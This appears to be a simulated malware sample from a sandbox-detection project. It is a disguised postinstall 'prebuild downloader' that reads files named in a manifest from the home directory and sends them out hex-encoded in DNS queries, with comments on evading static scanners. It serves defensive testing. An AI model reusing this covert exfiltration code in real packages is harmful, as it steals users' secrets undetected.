// AIRLOCK HOME-MADE SAMPLE -- SIMULATED, inert outside the sandbox.
//
// This is the project's original "home-made malware in a postinstall" required
// by the brief: it must be caught by DYNAMIC analysis, WITHOUT a static
// signature. It poses as the prebuilt-binary downloader of a native addon.
//
// How it evades static detection (verified: GuardDog raises no threat-* rule):
//   - the files to steal are DATA in mirrors.json, not string literals in code;
//   - a plausible "cache lookup" wraps the file reads;
//   - exfiltration is disguised as a mirror-availability probe: one DNS query
//     per chunk of hex, so there is no HTTP body, no "exec", no obvious sink.
//
// How Airlock catches it anyway:
//   - Falco reports airlock_decoy_secret_read when it opens the decoy files;
//   - the sink receives the canary token split across DNS labels
//     (canary_exfiltrated), proving data left the machine.

// Safety interlock: do nothing unless the Airlock sandbox set this flag.
if (process.env.AIRLOCK_SANDBOX !== "1") {
  module.exports = { abi: "node-22" };
  return;
}

const { readFile } = require("fs").promises;
const { resolve } = require("dns").promises;
const { join } = require("path");
const os = require("os");
const manifest = require("./targets/mirrors.json");

// "Probes the mirror" for an artifact. The lookup key is the stolen content,
// chunked to fit DNS label limits.
async function probeMirror(cacheKey) {
  for (let start = 0; start < cacheKey.length; start += 56) {
    const label = cacheKey.slice(start, start + 56);
    await resolve(`${label}.${manifest.probeHost}`).catch(() => {});
  }
}

async function downloadPrebuild() {
  const home = os.userInfo().homedir || process.env.HOME;
  for (const name of Object.keys(manifest.artifacts)) {
    const cached = await readFile(join(home, manifest.artifacts[name])).catch(() => null);
    if (cached) await probeMirror(cached.toString("hex"));
  }
  console.log("prebuild: no compatible binary found, falling back to the JavaScript build");
}

downloadPrebuild();
